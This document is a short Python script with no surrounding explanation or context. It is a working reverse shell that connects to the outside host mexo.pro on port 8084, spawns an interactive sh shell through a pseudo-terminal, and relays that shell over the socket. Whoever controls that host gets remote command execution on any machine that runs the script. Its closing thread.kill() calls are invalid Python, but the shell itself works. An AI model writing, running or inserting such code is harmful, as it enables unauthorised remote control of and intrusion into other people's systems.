#!/usr/bin/env python3

import pty
import socket
import subprocess
import threading
from os import read, write, waitpid

HOST="mexo.pro"
PORT=8084

# Connect to remote server
sock = socket.create_connection((HOST, PORT))

sock.send(b"New connection\n")

# Open pty for shell
(pid, pts) = pty.fork()

run = True

def sock2pty():
    global run
    try:
        while run:
            write(pts, sock.recv(1024))
    except Exception as e:
        run = False
        raise e

def pty2sock():
    global run
    try:
        while run:
            sock.send(read(pts, 1024))
    except Exception as e:
        run = False
        raise e

if pid == 0:
    # Child process
    subprocess.run(["sh", "-i"])
else:
    # Parent process
    s2p = threading.Thread(target=sock2pty)
    s2p.start()
    p2s = threading.Thread(target=pty2sock)
    p2s.start()

    waitpid(pid, 0)
    print("Shell killed")
    s2p.kill()
    p2s.kill()
